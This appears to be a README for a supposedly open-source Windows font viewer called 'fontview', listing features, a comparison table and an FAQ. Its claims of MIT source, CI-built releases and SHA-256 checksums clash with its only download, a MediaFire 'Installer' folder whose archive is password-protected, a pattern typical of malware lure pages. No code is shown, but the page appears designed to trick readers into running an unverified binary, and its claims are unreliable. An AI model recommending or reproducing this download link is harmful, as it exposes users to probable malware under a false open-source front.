# fontview

🔤 Free, open-source font viewer for Windows — preview, compare and manage installed fonts offline. 100 MB portable, no ads, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Grid preview of everything** — all installed fonts rendered with your sample text, no clicking one by one
- ✅ **Custom sample text** — type the actual project string so you judge real copy, not a pangram
- ✅ **Compare mode** — up to four fonts side by side at identical sizes for close calls
- ✅ **Glyph browser** — full character map per font including Cyrillic, Greek and symbols coverage
- ✅ **Filter and sort** — narrow by weight, width, serif or script; sort by family or install date
- ✅ **Install and remove** — mount a folder of font files for preview and install selectively
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with SHA-256 releases

## Why fontview

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **fontview** | NexusFont | FontViewOK | Windows Preview |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Free | Built-in |
| Open source | **Yes** | No | No | No |
| Custom sample text in grid | **Yes** | Yes | Partial | One line |
| Four-font compare mode | **Yes** | Partial | No | No |
| Glyph coverage browser | **Yes** | Yes | No | No |
| Portable, no install | **Yes, 100 MB** | Installer | Zip | With OS |

## FAQ

**how to preview all fonts on Windows quickly?**

Windows font preview opens one file at a time behind three dialogs, which is unusable when picking a pairing from 300 installed families. fontview tiles every font with your own sample text, compares finalists side by side, and shows glyph coverage before you commit. It is a 100 MB portable exe, MIT, offline with no ads.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark type grid (#121417, violet #A78BFA): six font tiles per row rendering the sample text, size slider at 28 px, filter chips serif and sans.
2. Compare mode: four columns with the same sentence, spacing and weight labels above, winner star on the second column.
3. Glyph browser: character table for the selected font, Cyrillic block complete, missing glyphs grayed, install button bottom right.

## Download

| Source | Link |
|---|---|
| 💾 **Installer fontview** | [Installer fontview](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).